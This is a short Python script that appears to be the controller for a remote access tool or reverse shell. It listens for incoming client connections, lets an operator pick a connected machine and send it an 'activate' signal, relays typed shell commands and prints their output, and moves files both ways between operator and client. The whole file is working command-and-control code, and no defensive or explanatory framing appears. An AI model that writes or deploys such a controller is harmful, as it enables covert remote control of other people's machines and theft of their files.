import sys
import time
import socket
from common import pr, clear, Send, Receive

# server socket
server = socket.socket()
server.bind(('', 1000))
server.listen()
server.settimeout(10)

# client sockets
socks = []
clients = []
active = False

def close(sock, client):
  socks.remove(sock)
  clients.remove(client)
  sock.close()

def refresh():
  clear()
  pr('Listening for clients...')

  if not clients:
    return

  for i in range(0, len(clients)):
    pr('➡️ Client %d: %s' % (i, clients[i]))

  pr('Press Ctrl+C to interact with client.')

while True:
  refresh()

  try:
    try:
      s, a = server.accept()
    except socket.timeout:
      continue
    s.settimeout(None)
    socks.append(s)
    clients.append(str(a))
    refresh()

  except KeyboardInterrupt:
    pr('\r')
    activate = int(input('Enter option: '))

    if activate == -1:
      sys.exit()
    
    Send(socks[activate], 'activate')
    pr('Activating client ' + str(activate))

    sock = socks[activate]
    client = clients[activate]
    active = True

  while active:
    try:
      data = Receive(sock)
    except:
      pr('Client %s disconnected' % client)
      active = False
      close(sock, client)
      break

    # if not data:
    #   active = False
    #   close(sock, client)
    #   break

    if type(data) == str:
      print(data, end='')

    # ⬇️
    else:
      try:
        f = open(data[0], 'wb')
        f.write(data[1])
        f.close()
      except IOError:
        pr('Error opening file')
     
      continue # recv more

    # TODO: cmd empty
    nc = input()
    nc = nc.strip()

    if nc == '-1':
      active = False
      close(sock, client)
      break

    # ⬆️
    elif nc.startswith('ul '):
      fn = nc[3:]
      try:
        f = open(fn, 'rb')
        d = f.read()
        f.close()

        Send(sock, d, fn)
        time.sleep(1)
      except IOError:
        pr('Error opening file')

    else:
      Send(sock, nc)
